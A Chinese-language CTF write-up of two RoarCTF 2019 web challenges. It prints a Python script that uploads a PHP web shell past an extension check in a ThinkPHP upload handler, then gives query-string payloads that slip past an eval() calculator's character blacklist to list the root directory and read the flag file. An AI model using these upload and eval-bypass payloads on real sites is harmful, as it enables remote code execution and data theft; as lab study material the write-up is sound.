## 0x01 [RoarCTF 2019]Simple Upload

首页给了源码

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

根据Thinkphp的URL构造

``/index.php/home/index/upload``可以上传文件

``$upload->upload() ;``无参数可以上传任意个数文件而``allowExts``只能限制第一个的后缀名

然后再利用Upload ``'saveName'     => array('uniqid', ''),``基于时间命名的特性进行爆破shell文件名,getshell,（这里是直接把shell变成flag了....）

```php
import requests
import base64

url = "http://70e50a65-e216-4fd2-aa95-a79ba62daaa7.node3.buuoj.cn/index.php/home/index/upload"

files = {
            "file":("a.txt",'a'),
            "file1":("b.php", '<?php echo "233";eval($_REQUEST["eki"]);'),
        }

data = {"upload":"Submit"}

r = requests.post(url=url, data=data, files=files)
print(r.text) 
```

## 0x02 Easy Calc

点进去是一个简单的计算器

输入1+1返回2

输入{{1+1}}提示无法计算

看下源代码

```js
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
```

调用了calc.php,访问看一下

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

使用了eval()意味着我们只要能绕过blacklist就能执行任意命令。

测试了一下只能输入运算符和数字，怎么办....

查阅资料发现只要在num前加个空格就可以绕过waf对num的数字检测了

```
poc=/calc.php?%20num=phpinfo()
```

Exp:

```
payload=/calc.php?%20num=var_dump(scandir(chr(47))) //"/" ""被ban,用chr绕过

1array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" }

payload=var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))

flag{ec5c334b-a625-4a44-bede-7fb5dd20ef87} int(43)
```

### 参考资料

https://www.freebuf.com/articles/web/213359.html